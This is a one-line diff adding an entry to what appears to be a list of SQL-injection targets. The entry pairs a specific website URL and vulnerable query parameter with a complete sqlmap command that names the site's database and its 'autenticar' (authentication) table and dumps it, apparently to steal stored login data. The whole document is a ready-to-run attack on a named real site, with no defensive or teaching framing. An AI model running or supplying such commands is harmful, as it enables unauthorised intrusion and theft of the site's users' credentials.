@@ -1,0 +1,1 @@
+http://www.ecosdaliberdade.com.br/fotos.php?a=289 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u http://www.ecosdaliberdade.com.br/fotos.php?a=289 -D ecosdaliberdade1 -T autenticar --dump
